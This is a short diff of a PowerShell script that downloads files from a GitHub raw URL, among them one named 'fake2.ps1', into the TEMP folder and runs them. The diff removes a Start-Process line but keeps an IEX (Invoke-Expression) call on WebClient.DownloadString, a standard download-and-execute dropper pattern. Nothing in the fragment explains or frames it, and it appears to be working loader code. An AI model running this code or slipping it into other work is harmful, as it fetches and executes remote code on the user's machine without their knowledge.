@@ -9,5 +9,4 @@ Invoke-WebRequest -Uri $url2 -OutFile $output2
 $url3 = "https://raw.githubusercontent.com/cia168168/folder/main/fake/fake2.ps1"
 $output3 = "$env:TEMP\fake2.ps1"
 Invoke-WebRequest -Uri $url3 -OutFile $output3
-Start-Process $output3
 IEX ((New-Object Net.WebClient).DownloadString($output3))
